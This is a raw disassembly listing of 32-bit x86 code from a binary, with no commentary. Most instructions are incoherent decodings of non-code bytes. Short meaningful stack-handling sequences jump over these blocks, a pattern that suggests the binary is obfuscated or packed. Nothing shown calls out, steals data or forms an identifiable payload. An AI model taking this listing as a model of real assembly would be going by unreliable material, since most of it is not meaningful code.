  402134:	xor    DWORD PTR [edi],ebp
  402136:	push   eax
  402137:	dec    esi
  402138:	cld    
  402139:	int    0xc7
  40213b:	pop    ecx
  40213c:	retf   
  40213d:	fld    TBYTE PTR [bx+di+0x44b6]
  402142:	xchg   edx,eax
  402143:	ror    BYTE PTR [eax+0xc],1
  402146:	(bad)  
  402147:	pop    edi
  402148:	xor    al,0x68
  40214a:	inc    eax
  40214b:	mov    al,0x34
  40214d:	jge    0x4020e6
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	cmp    al,0x53
  40216b:	enter  0x1e01,0x2
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402186
  402176:	inc    esi
  402177:	jnp    0x4021c4
  402179:	in     eax,0xe1
  40217b:	fadd   DWORD PTR [esi+0x61fb1acf]
  402181:	ret    
  402182:	shl    DWORD PTR [eax],1
  402184:	inc    esp
  402185:	push   0x419f103e
  40218a:	jb     0x40218c
  40218c:	pop    DWORD PTR [ecx+ebp*8-0x73fef906]
  402193:	retf   0xbb18
  402196:	test   eax,0xcf62208a
  40219b:	js     0x4021ea
  40219d:	sub    al,0x1e
  40219f:	int3   
  4021a0:	repnz addr16 inc ebx
  4021a3:	jmp    0x3299:0x80abe5bf
  4021aa:	pop    edx
  4021ab:	iret   
  4021ac:	push   esp
  4021ad:	(bad)  
  4021ae:	push   esp
  4021af:	ins    BYTE PTR es:[edi],dx
  4021b0:	out    dx,eax
  4021b1:	in     eax,0x9
  4021b3:	lods   eax,DWORD PTR ds:[esi]
  4021b4:	add    esp,ebx
  4021b6:	inc    esp
  4021b7:	imul   edx,DWORD PTR [eax+0xf],0xf
  4021bb:	inc    esp
  4021bc:	fcmovbe st,st(5)
  4021be:	fiadd  DWORD PTR [edi]
  4021c0:	stos   DWORD PTR es:[edi],eax
  4021c1:	xlat   BYTE PTR ds:[ebx]
  4021c2:	mov    ebx,0x884caf6c
  4021c7:	repnz mov WORD PTR [ebx+0x3a3b2b88],es
  4021ce:	enter  0x1496,0x44
  4021d2:	ins    BYTE PTR es:[edi],dx
  4021d3:	stc    
  4021d4:	adc    BYTE PTR [edi],cl
  4021d6:	xor    BYTE PTR [edx-0x6c947ffa],0x3e
  4021dd:	jmp    0x40218f
  4021df:	pop    ds
  4021e0:	jmp    0x402252
  4021e2:	call   DWORD PTR [ebx]
  4021e4:	js     0x402190
  4021e6:	mov    dh,0x66
  4021e8:	mov    ds:0x8be115b1,ax
  4021ee:	adc    al,0x41
  4021f0:	repnz inc edx
  4021f2:	test   al,0x9
  4021f4:	mov    bl,0xe3
  4021f6:	shl    BYTE PTR [ebp+0x49daec1f],1
  4021fc:	adc    dl,cl
  4021fe:	pop    ss
  4021ff:	cwde   
  402200:	sbb    ch,BYTE PTR [esi+edi*2-0x4058d52d]
  402207:	fadd   QWORD PTR [esi+esi*4]
  40220a:	push   0x80bac512
  40220f:	ins    BYTE PTR es:[edi],dx
  402210:	aad    0x17
  402212:	xchg   esi,eax
  402213:	jmp    0x40220b
  402215:	das    
  402216:	mov    edx,0xc2fa4fa3
  40221b:	xor    esi,DWORD PTR ss:[ebx+0x36471303]
  402222:	sbb    al,0x54
  402224:	mov    al,ds:0x345eef68
  402229:	jg     0x402276
  40222b:	test   al,0xc2
  40222d:	push   esp
  40222e:	dec    BYTE PTR [ebx-0x54]
  402231:	mov    esp,0x93bfaed6
  402236:	or     DWORD PTR [eax+0x74b09963],0xffffff8d
  40223d:	in     eax,0xcf
  40223f:	xor    DWORD PTR [edx+eax*4+0x11],ebx
  402243:	xchg   edx,esp
  402245:	stos   BYTE PTR es:[edi],al
  402246:	ja     0x40221f
  402248:	clc    
  402249:	scas   al,BYTE PTR es:[edi]
  40224a:	sbb    BYTE PTR [esi],dl
  40224c:	cdq    
  40224d:	dec    ecx
  40224e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40224f:	pushf  
  402250:	ret    
  402251:	in     eax,0x70
  402253:	out    dx,eax
  402254:	mov    al,0xcc
  402256:	sub    BYTE PTR [ebp+0x62c96fe0],bh
  40225c:	sar    edi,cl
  40225e:	int    0x85
  402260:	xchg   BYTE PTR [esi],dl
  402262:	je     0x4022a2
  402264:	pop    ss
  402265:	or     DWORD PTR ds:0xcb77526d,0xb8743ee
  40226f:	out    dx,al
  402270:	mov    edi,0x42f7075f
  402275:	xchg   esp,eax
  402276:	add    DWORD PTR [ebp+0x1c],ebx
  402279:	jo     0x402266
  40227b:	arpl   WORD PTR [edi+edx*8-0x2d0f73c],di
  402282:	ret    
  402283:	mov    ch,BYTE PTR [edx-0x325b6936]
  402289:	jnp    0x40228f
  40228b:	rol    BYTE PTR [edi],1
  40228d:	test   BYTE PTR [edi],ah
  40228f:	dec    ebx
  402290:	jp     0x4022cf
  402292:	not    ebp
  402294:	sub    ebp,DWORD PTR [ebx+0x7569cf35]
  40229a:	xor    eax,0x28defcda
  40229f:	rcl    BYTE PTR [ebx],1
  4022a1:	out    dx,al
  4022a2:	cli    
  4022a3:	test   BYTE PTR [eax],al
  4022a5:	fiadd  DWORD PTR [eax-0x6a]
  4022a8:	mov    eax,0x74c6cf4
  4022ad:	pop    eax
  4022ae:	arpl   WORD PTR [esi],bx
  4022b0:	nop
  4022b1:	shl    DWORD PTR [eax+0x1b],1
  4022b4:	lahf   
  4022b5:	inc    ecx
  4022b6:	jge    0x402289
  4022b8:	call   0xfc93b55
  4022bd:	push   edi
  4022be:	dec    ebp
  4022bf:	scas   eax,DWORD PTR es:[edi]
  4022c0:	xor    DWORD PTR [ebp-0x445f18d],esp
  4022c6:	dec    BYTE PTR [eax-0x5e6f9635]
  4022cc:	dec    eax
  4022cd:	imul   DWORD PTR [eax-0x49]
  4022d0:	rcl    BYTE PTR [ebx],1
  4022d2:	xchg   ecx,eax
  4022d3:	cmp    dl,BYTE PTR [esi+0x69]
  4022d6:	fild   DWORD PTR [ebp+0x20fd3568]
  4022dc:	sub    edi,DWORD PTR [ebx+ecx*2]
  4022df:	loopne 0x402351
  4022e1:	pop    edi
  4022e2:	(bad)  
  4022e3:	ja     0x402312
  4022e5:	sahf   
  4022e6:	cmp    al,0x3b
  4022e9:	(bad)  [ebp-0x1becea4]
  4022ef:	imul   esi,DWORD PTR [edx-0x5fd12b63],0x1f965c5a
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	cld    
  402358:	jno    0x402398
  40235a:	scas   eax,DWORD PTR es:[edi]
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x40233a
  402364:	push   esp
  402365:	f2xm1  
  402367:	push   esi
  402368:	clc    
  402369:	mov    ah,0x99
  40236b:	xor    DWORD PTR [esi-0xf6a6f9a],esi
  402371:	cmp    bh,ch
  402373:	adc    ch,0xd8
  402376:	jmp    0x40231e
  402378:	cmp    eax,DWORD PTR [ebp-0x2b26d6db]
  40237e:	repnz pop eax
  402380:	scas   eax,DWORD PTR es:[edi]
  402381:	push   edx
  402382:	cmp    dh,ch
  402384:	dec    ecx
  402385:	jns    0x4023ec
  402387:	jmp    0x402395
  402389:	js     0x4023ba
  40238b:	sub    BYTE PTR [ebx+0xef95e6b],al
  402391:	mov    eax,0xe1eae135
  402396:	in     al,0x8f
  402398:	adc    al,0xd4
  40239a:	out    0x81,eax
  40239c:	pop    ecx
  40239d:	add    edi,DWORD PTR [ebx-0x65ed9f35]
  4023a3:	sar    DWORD PTR [eax*2-0x18bf4aec],cl
  4023aa:	data16 repz in al,0xcd
  4023ae:	pushf  
  4023af:	or     al,0x18
  4023b1:	icebp  
  4023b2:	arpl   WORD PTR [ecx+0x27],si
  4023b5:	push   ecx
  4023b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b7:	or     ch,BYTE PTR [esi+0x3d693d6d]
  4023bd:	jae    0x402355
  4023bf:	jo     0x4023df
  4023c1:	cmp    bl,BYTE PTR [esi+0x10]
  4023c4:	adc    al,0x4c
  4023c6:	aas    
  4023c7:	xchg   esp,eax
  4023c8:	cli    
  4023c9:	xchg   esi,eax
  4023ca:	retf   
  4023cb:	adc    al,0x5a
  4023cd:	mov    ebx,0x8a9a3335
  4023d2:	mov    eax,0x34a042b4
  4023d7:	cmp    esp,eax
  4023d9:	cmp    ebp,DWORD PTR [edi]
  4023db:	int3   
  4023dc:	fnstcw WORD PTR [ecx-0x776db65b]
  4023e2:	in     al,0x86
  4023e4:	pop    eax
  4023e5:	es ds ins BYTE PTR es:[edi],dx
  4023e8:	cs fcomip st,st(1)
  4023eb:	les    edi,FWORD PTR [ecx]
  4023ed:	xchg   ebp,eax
  4023ee:	jmp    0x4023b5
  4023f0:	loope  0x4023bc
  4023f2:	mov    bl,BYTE PTR [edi-0x30]
  4023f5:	in     al,0xc5
  4023f7:	lock arpl WORD PTR [esi],si
  4023fa:	mov    esp,fs
  4023fc:	sub    eax,0x76618561
  402401:	inc    esi
  402402:	or     BYTE PTR [edx-0x7f],ah
  402405:	scas   al,BYTE PTR es:[edi]
  402406:	fs jmp 0x479c:0x62a01568
  40240e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40240f:	(bad)  
  402410:	rcr    BYTE PTR [ecx],cl
  402412:	ss xchg edx,eax
  402414:	adc    ebx,esp
  402416:	or     DWORD PTR [edi+eiz*4-0x16],edi
  40241a:	sti    
  40241b:	xchg   ebx,eax
  40241c:	ds jb  0x402445
  40241f:	sub    dl,BYTE PTR [edi+0x1f]
  402422:	adc    eax,0x6faefdd5
  402427:	call   0xba8:0x29919c7c
  40242e:	mov    esi,0x91706278
  402433:	pop    ss
  402434:	shr    DWORD PTR [esi-0x4430a57b],0x45
  40243b:	test   eax,0xbae49f1b
  402440:	sub    BYTE PTR [edx],dh
  402442:	xlat   BYTE PTR ds:[ebx]
  402443:	das    
  402444:	cmp    DWORD PTR [edi-0x4705d958],0x26
  40244b:	lea    ecx,[edx-0x22133536]
  402451:	add    eax,0x893fe6db
  402456:	sub    BYTE PTR [ebp+0x3],bl
  402459:	push   eax
  40245a:	mov    ebp,ebx
  40245c:	dec    ebx
  40245d:	fsub   DWORD PTR [ecx-0x3bcd3094]
  402463:	scas   al,BYTE PTR es:[edi]
  402464:	lods   al,BYTE PTR ds:[esi]
  402465:	adc    dh,BYTE PTR [ebp+0x2e303c5f]
  40246b:	push   esi
  40246c:	or     BYTE PTR [eax+0x75],ah
  40246f:	pop    es
  402470:	(bad)  
  402471:	shl    BYTE PTR [edi+0x33],0x1b
  402475:	cmp    BYTE PTR [edx+0x273cfcb4],ch
  40247b:	mov    edi,0x85e3ca88
  402480:	mov    ch,0x99
  402482:	out    dx,eax
  402483:	aas    
  402484:	arpl   WORD PTR [esi],ax
  402486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402487:	push   ebx
  402488:	mov    ds:0xe590d180,eax
  40248d:	(bad)
  402491:	xor    bh,bl
  402493:	out    dx,al
  402494:	adc    eax,0xc0a447d2
  402499:	int    0xb2
  40249b:	aas    
  40249c:	sbb    eax,DWORD PTR [ebx-0x19a82df6]
  4024a2:	or     BYTE PTR [ebp-0x648deda],0x72
  4024a9:	cmp    al,0xa8
  4024ab:	cmc    
  4024ac:	push   esp
  4024ad:	mov    edx,0x78d440c2
  4024b2:	loop   0x4024f4
  4024b4:	lea    eax,[esi-0x21d954ba]
  4024ba:	jnp    0x402485
  4024bc:	popa   
  4024bd:	aaa    
  4024be:	aaa    
  4024bf:	xor    ebx,DWORD PTR [eax]
  4024c1:	mov    ecx,?
  4024c3:	daa    
  4024c4:	fcomp  QWORD PTR [ecx+edx*1-0x66]
  4024c8:	stos   DWORD PTR es:[edi],eax
  4024c9:	jo     0x402488
  4024cb:	pop    eax
  4024cc:	imul   ecx,DWORD PTR [edx+ebp*1+0x7d],0xbdcf0b3
  4024d4:	test   DWORD PTR [esi+0x6f],ecx
  4024d7:	mov    al,0xc7
  4024d9:	out    0xdf,al
  4024db:	xchg   esp,eax
  4024dc:	cmp    dl,bh
  4024de:	xor    eax,0xb610e1d5
  4024e3:	and    eax,0x8bc9a8e5
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	push   ebx
  40250e:	cmp    eax,0x126214f
  402513:	jle    0x402593
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402564
  40251a:	pop    ds
  40251b:	add    DWORD PTR [ecx-0x69],0xffffffe5
  40251f:	mov    eax,0xc2090371
  402524:	or     edi,DWORD PTR [ecx-0x7916d4f8]
  40252a:	fs aad 0x34
  40252d:	mov    dh,0x5b
  40252f:	sub    ah,dh
  402531:	pop    ecx
  402532:	push   es
  402533:	xchg   edx,eax
  402534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402535:	add    DWORD PTR [edi],edi
  402537:	and    al,0xc5
  402539:	sub    BYTE PTR [ebx],al
  40253b:	xor    edi,ecx
  40253d:	jae    0x40250b
  40253f:	sub    eax,0x2c1c1347
  402544:	and    BYTE PTR [esi-0x220e96],ah
  40254a:	xlat   BYTE PTR ds:[ebx]
  40254b:	gs inc edi
  40254d:	mov    ds:0xc67631f9,eax
  402552:	stc    
  402553:	mov    al,0xee
  402555:	adc    edx,0xffffffc7
  402558:	(bad)  
  402559:	adc    bl,dh
  40255b:	sti    
  40255c:	ja     0x4025c9
  40255e:	xor    al,0x61
  402560:	cld    
  402561:	das    
  402562:	push   es
  402563:	dec    edi
  402564:	sub    al,0xa2
  402566:	imul   ebp,eax,0x5220c138
  40256c:	add    BYTE PTR [edi-0x25],cl
  40256f:	cwde   
  402570:	and    ah,BYTE PTR [eax-0x6db32e98]
  402576:	fxch   st(1)
  402578:	ret    0x8398
  40257b:	cld    
  40257c:	sub    BYTE PTR [esi],0x1
  40257f:	push   ecx
  402580:	cmp    al,0xce
  402582:	mov    ebp,0x4d087cdb
  402587:	pop    esp
  402588:	jne    0x4025c8
  40258a:	sub    bh,BYTE PTR [edx]
  40258c:	dec    ecx
  40258d:	mov    ah,0xaa
  40258f:	add    al,BYTE PTR ds:0x3f4f9731
  402595:	jno    0x402577
  402597:	vmwrite ebp,DWORD PTR [edi+ebx*1-0x3601aad0]
  40259f:	mov    dl,0x3e
  4025a1:	dec    esp
  4025a2:	retf   
  4025a3:	int3   
  4025a4:	fild   WORD PTR [edx-0x468d8dbe]
  4025aa:	jae    0x402543
  4025ac:	xchg   cl,ch
  4025ae:	sub    BYTE PTR [ebx+0x684565dd],ah
  4025b4:	and    DWORD PTR [ecx],ecx
  4025b6:	xor    DWORD PTR [ecx+0x452e61c5],ecx
  4025bc:	ja     0x4025a2
  4025be:	stos   BYTE PTR es:[edi],al
  4025bf:	dec    edi
  4025c0:	xchg   esp,eax
  4025c1:	fsubr  QWORD PTR cs:[esi+0xf790def]
  4025c8:	xchg   esp,eax
  4025c9:	sub    eax,0xbbc1e89c
  4025ce:	les    esi,FWORD PTR [eax-0x3fe678f7]
  4025d4:	xchg   esi,eax
  4025d5:	xchg   edx,eax
  4025d6:	inc    eax
  4025d7:	cmp    dl,dh
  4025d9:	mov    eax,gs
  4025db:	outs   dx,DWORD PTR ds:[esi]
  4025dc:	lods   al,BYTE PTR ds:[esi]
  4025dd:	retf   
  4025de:	pop    esi
  4025df:	cmp    eax,0xcbd026cc
  4025e4:	mov    al,0x55
  4025e6:	ins    DWORD PTR es:[edi],dx
  4025e7:	scas   al,BYTE PTR es:[edi]
  4025e8:	jmp    esp
  4025ea:	test   DWORD PTR [edx],0xb19cdb9d
  4025f0:	mov    WORD PTR [eax+0x4126c808],fs
  4025f6:	sbb    al,0x90
  4025f8:	test   DWORD PTR [ecx],0x8a46a3b
  4025fe:	mov    dl,0x21
  402600:	inc    ecx
  402601:	outs   dx,DWORD PTR ds:[esi]
  402602:	sub    eax,0x82a7370e
  402607:	pop    ss
  402608:	enter  0x69a,0x39
  40260c:	mov    bl,0x7b
  40260e:	mov    edx,0x95d99355
  402613:	mov    DWORD PTR [esi-0x6e],ebx
  402616:	dec    esp
  402617:	dec    edx
  402618:	and    edx,esi
  40261a:	adc    BYTE PTR [esi+0x3ecd27af],dh
  402620:	addr16 sbb ecx,ebx
  402623:	mov    esi,0xb3ee13c1
  402628:	inc    ecx
  402629:	clc    
  40262a:	fwait
  40262b:	ror    BYTE PTR [edi+ecx*4-0x12],1
  40262f:	xlat   BYTE PTR ds:[ebx]
  402630:	adc    DWORD PTR [ecx-0x3b],esi
  402633:	cs xchg eax,eax
  402636:	sahf   
  402637:	lock pop ss
  402639:	adc    ebp,DWORD PTR [edx+0x3c5a837d]
  40263f:	inc    esi
  402640:	and    ah,dl
  402642:	dec    esp
  402643:	inc    edx
  402644:	test   al,0xc3
  402646:	sub    eax,0x5c89d34e
  40264b:	outs   dx,BYTE PTR ds:[esi]
  40264c:	add    BYTE PTR ds:0x5f53e895,dl
  402652:	cmp    BYTE PTR [bx+0x47],dl
  402656:	push   cs
  402657:	bound  esp,QWORD PTR [ebp+0x79]
  40265a:	adc    esp,ebx
  40265c:	shl    BYTE PTR [esp+ebp*2],0xb3
  402660:	dec    esi
  402661:	iret   
  402662:	xchg   DWORD PTR [edx-0x6eecaa40],edx
  402668:	xchg   esp,eax
  402669:	cli    
  40266a:	mov    eax,0x52a46d94
  40266f:	das    
  402670:	sub    ah,BYTE PTR [eax]
  402672:	sub    dl,BYTE PTR [eax-0x18]
  402675:	pusha  
  402676:	dec    esi
  402677:	pop    edi
  402678:	xchg   ecx,eax
  402679:	sub    al,0xb2
  40267b:	in     eax,dx
  40267c:	ins    BYTE PTR es:[edi],dx
  40267d:	lea    esp,[ebx]
  40267f:	(bad)  
  402680:	sub    al,BYTE PTR [ecx-0x1f022b94]
  402686:	pop    esi
  402687:	jmp    0x6cf3:0xe4a02719
  40268e:	int    0x3f
  402690:	and    eax,0xb6e8d194
  402695:	push   ds
  402696:	pop    esi
  402697:	mov    ds:0xd757df4e,eax
  40269c:	fbstp  TBYTE PTR [ebx]
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	or     al,0x5b
  4026d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026d5:	jmp    DWORD PTR [edx-0x58181f2]
  4026db:	jg     0x40275b
  4026dd:	jle    0x402661
  4026df:	cmp    DWORD PTR [edx-0x2304cf10],esp
  4026e5:	aaa    
  4026e6:	xor    ah,BYTE PTR [edi+0x53eee9bb]
  4026ec:	dec    edi
  4026ed:	aaa    
  4026ee:	(bad)  
  4026ef:	outs   dx,BYTE PTR ds:[esi]
  4026f0:	repnz pop ebx
  4026f2:	add    eax,0xb32f5ed7
  4026f7:	sar    DWORD PTR [eax+eax*2+0x38460303],0xc
  4026ff:	mov    cl,0xaa
  402701:	test   ebp,ebp
  402703:	outs   dx,BYTE PTR ds:[esi]
  402704:	sub    DWORD PTR [edx-0x2fabe752],ecx
  40270a:	jnp    0x4026d1
  40270c:	(bad)  
  40270d:	pop    esi
  40270e:	jbe    0x402735
  402710:	aad    0x57
  402712:	ins    DWORD PTR es:[edi],dx
  402713:	pushf  
  402714:	pop    edi
  402715:	pxor   mm0,QWORD PTR [edi-0x63d04aac]
  40271c:	mov    esi,DWORD PTR [edi-0x63713dd9]
  402722:	call   0x646ffdee
  402727:	imul   eax,DWORD PTR [esi-0x1b],0xffffffda
  40272b:	int    0xdc
  40272d:	pusha  
  40272e:	pop    eax
  40272f:	ins    DWORD PTR es:[edi],dx
  402730:	imul   ecx,DWORD PTR [edx+0x4d5e3fd9],0xffffffe5
  402737:	sub    eax,0x54d187a7
  40273c:	call   0x12d7305d
  402741:	pop    edx
  402742:	outs   dx,DWORD PTR ds:[esi]
  402743:	cmp    bl,BYTE PTR [ecx+0x48]
  402746:	lock jae 0x4026e6
  402749:	xchg   bh,ch
  40274b:	push   cs
  40274c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40274d:	lods   eax,DWORD PTR ds:[esi]
  40274e:	clc    
  40274f:	fnstcw WORD PTR [ebp+0xf]
  402752:	mov    edi,ecx
  402754:	xchg   esp,eax
  402755:	mov    edi,ds
  402757:	loop   0x402783
  402759:	aad    0x4b
  40275b:	popa   
  40275c:	iret   
  40275d:	sub    al,0x78
  40275f:	fistp  DWORD PTR [ebx]
  402761:	mov    esi,DWORD PTR [esi]
  402763:	mov    edi,DWORD PTR [edi]
  402765:	imul   ecx,DWORD PTR [eax+0x23874187],0x190dfe33
  40276f:	int3   
  402770:	jbe    0x40274c
  402772:	mov    edi,0x599d1fea
  402777:	ret    
  402778:	push   edi
  402779:	adc    BYTE PTR [edi],cl
  40277b:	mov    edi,0x5c6c7727
  402780:	xchg   ecx,eax
  402781:	mov    esp,0x3dbde206
  402786:	loopne 0x402770
  402788:	imul   eax,DWORD PTR [edx],0x4f4461f
  40278e:	arpl   WORD PTR [ebp+0x1aaf5a90],bx
  402794:	xor    BYTE PTR [ebx],0xad
  402797:	scas   eax,DWORD PTR es:[edi]
  402798:	mov    BYTE PTR [edi-0x25388484],0x5d
  40279f:	rol    edx,cl
  4027a1:	sub    eax,0xe9cf13ce
  4027a6:	dec    esi
  4027a7:	ja     0x4027c9
  4027a9:	mov    ebx,0xe30dc2e3
  4027ae:	adc    DWORD PTR [edi-0x56],ebp
  4027b1:	adc    DWORD PTR [esi],ebx
  4027b3:	mov    bl,0x9d
  4027b5:	jbe    0x40282c
  4027b7:	cwde   
  4027b8:	xor    ah,ch
  4027ba:	dec    esi
  4027bb:	sbb    BYTE PTR [edi+ebx*4+0x51],bh
  4027bf:	mov    dl,0x49
  4027c1:	mov    ebx,0xcdd70c2c
  4027c6:	aam    0xd1
  4027c8:	mov    edx,0xadb80ee4
  4027cd:	jo     0x4027d1
  4027cf:	nop
  4027d0:	mov    ch,0xfe
  4027d2:	jo     0x402806
  4027d4:	lds    ecx,FWORD PTR [ebp+ecx*4+0x6eeed7dd]
  4027db:	data16 add al,0x1e
  4027de:	push   edi
  4027df:	cmp    al,0x2c
  4027e1:	add    ch,bl
  4027e3:	addr16 cmp al,0xcf
  4027e6:	into   
  4027e7:	into   
  4027e8:	add    bl,bh
  4027ea:	test   BYTE PTR [ebx-0x6a],ah
  4027ed:	sub    eax,0xd1430af8
  4027f2:	jmp    0x8a497393
  4027f7:	leave  
  4027f8:	pop    esi
  4027f9:	into   
  4027fa:	add    DWORD PTR [esi+0x36],esi
  4027fd:	lahf   
  4027fe:	shl    BYTE PTR [esi+0x18e6bf9],cl
  402804:	test   al,0xc8
  402806:	adc    BYTE PTR [eax-0x3bfebc7b],al
  40280c:	mov    esi,0xea7dd147
  402811:	cmp    DWORD PTR [edx-0x36563d10],edx
  402817:	leave  
  402818:	inc    eax
  402819:	fnstenv [ecx+0x57652ca4]
  40281f:	mov    bh,0xec
  402821:	push   cs
  402822:	cld    
  402823:	sbb    DWORD PTR [edi-0x71eea28b],ebx
  402829:	xchg   ecx,eax
  40282a:	clc    
  40282b:	bswap  edx
  40282d:	loopne 0x402813
  40282f:	fisubr WORD PTR [ebp+0x4b]
  402832:	test   al,0xc1
  402834:	bound  ebx,QWORD PTR [edi]
  402836:	repz pop ecx
  402838:	sbb    DWORD PTR ds:0x2cdaa604,ebx
  40283e:	fidivr WORD PTR [ecx+0x26c2bf9e]
  402844:	inc    edx
  402845:	leave  
  402846:	mov    ebp,DWORD PTR [ebx-0xf]
  402849:	je     0x4028b5
  40284b:	ror    DWORD PTR [edx+0x76a68780],cl
  402851:	out    dx,eax
  402852:	repz adc eax,DWORD PTR [esi+0x2c751491]
  402859:	add    edi,DWORD PTR [ebx-0x7e]
  40285c:	aam    0x7e
  40285e:	jle    0x40286c
  402860:	fnstenv [edx-0x75]
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	(bad)  
  402884:	xchg   ebx,eax
  402885:	dec    ecx
  402886:	test   BYTE PTR [esi],ch
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402842
  402890:	xchg   edi,eax
  402891:	xchg   esi,eax
  402892:	ja     0x402851
  402894:	dec    ebx
  402895:	imul   ecx,DWORD PTR [esi],0xe887cd44
  40289b:	pop    ebx
  40289c:	sub    al,0x9
  40289e:	mov    bh,0xe2
  4028a0:	(bad)  
  4028a1:	jg     0x4028d3
  4028a3:	cld    
  4028a4:	pop    es
  4028a5:	and    DWORD PTR [ebx-0x46f6854f],edx
  4028ab:	rol    BYTE PTR [ecx],0x30
  4028ae:	mov    ebx,0xa2dcab4a
  4028b4:	sti    
  4028b5:	mov    ah,0x26
  4028b7:	jns    0x4028a8
  4028b9:	pop    esp
  4028ba:	sub    eax,0xc01c6555
  4028bf:	rcl    DWORD PTR [edi+0x7d5fc136],cl
  4028c5:	sub    DWORD PTR [eax],eax
  4028c7:	daa    
  4028c8:	js     0x402867
  4028ca:	mov    esp,0x2fb76244
  4028cf:	mov    bh,0xe5
  4028d1:	jmp    0xe6d7:0xedf317d6
  4028d8:	ja     0x4028e3
  4028da:	in     eax,0x8f
  4028dc:	mov    ebx,0xc85861ab
  4028e1:	(bad)  
  4028e2:	mov    bl,0x5a
  4028e4:	and    BYTE PTR [ebx],al
  4028e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e7:	jno    0x4028bd
  4028e9:	shl    BYTE PTR [edi+ebx*1-0x16399b34],cl
  4028f0:	js     0x402930
  4028f2:	dec    eax
  4028f3:	sub    BYTE PTR [ebp+0x37],cl
  4028f6:	test   BYTE PTR [edi-0x3c475edb],ch
  4028fc:	call   0x108f:0xa06a153f
  402903:	xor    al,0x97
  402905:	int    0x41
  402907:	scas   al,BYTE PTR es:[edi]
  402908:	aas    
  402909:	ins    DWORD PTR es:[edi],dx
  40290a:	retf   0x2432
  40290d:	push   esp
  40290e:	xor    edi,esi
  402910:	push   eax
  402911:	cli    
  402912:	inc    edx
  402913:	inc    ebp
  402914:	push   0x76751a91
  402919:	mov    bl,0x3c
  40291b:	in     eax,0xd0
  40291d:	(bad)  
  40291f:	nop
  402920:	inc    ebx
  402921:	ja     0x402912
  402923:	das    
  402924:	or     eax,0xd2a7654d
  402929:	cmp    bh,dh
  40292b:	shl    BYTE PTR [ecx],0xf3
  40292e:	mov    cl,0xee
  402930:	fsub   QWORD PTR [ecx+0x48]
  402933:	lods   al,BYTE PTR ds:[esi]
  402934:	cmp    ch,BYTE PTR [eax]
  402936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402937:	cmc    
  402938:	(bad)  
  402939:	push   ss
  40293a:	leave  
  40293b:	adc    DWORD PTR [ecx-0x1bb09cbf],edi
  402941:	int3   
  402942:	in     eax,0x9f
  402944:	das    
